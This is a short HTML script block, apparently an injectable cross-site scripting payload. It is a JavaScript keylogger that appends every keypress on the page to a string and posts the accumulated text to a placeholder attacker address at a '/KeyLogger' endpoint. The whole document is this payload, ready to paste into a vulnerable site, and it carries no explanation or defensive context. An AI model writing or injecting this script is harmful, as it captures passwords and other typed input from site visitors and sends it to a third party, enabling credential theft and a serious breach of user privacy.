<script type="text/javascript">
  var l = "";
  document.onkeypress = function (e) {
    l += e.key;
    fetch("https://{Attacker's IP/Domain Address}/KeyLogger", {
      method: "POST",
      headers: {
        "Content-Type": "application/x-www-form-urlencoded"
      },
      body: "data=" + encodeURIComponent(l)
    });
  };
</script>
